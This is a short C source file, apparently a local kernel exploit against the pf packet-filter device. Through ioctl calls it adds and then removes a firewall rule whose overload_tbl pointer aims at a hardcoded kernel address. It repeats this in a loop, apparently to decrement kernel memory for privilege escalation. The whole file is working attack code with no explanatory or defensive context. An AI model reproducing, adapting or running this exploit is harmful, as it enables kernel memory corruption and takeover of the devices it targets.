#include "generic.h"

static void pwn(unsigned int addr)
{
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr; 
    bzero(&trans, sizeof(trans));
    bzero(&trans_e, sizeof(trans_e));
    bzero(&pr, sizeof(pr));
    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    bzero(trans_e.anchor, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans));
    u_int32_t ticket = trans_e.ticket;
    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;
    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    bzero(pr.anchor, MAXPATHLEN);
    bzero(pr.anchor_call, MAXPATHLEN);
    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);
    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;

    pr.rule.overload_tbl = (void *)(addr - 0x4a4);

    errno = 0;
    assert(!ioctl(pffd, DIOCADDRULE, &pr));
    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));
    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}

int main()
{
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    while(num_decs--)
    pwn(0x38336a8c);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);

    return 0;
}
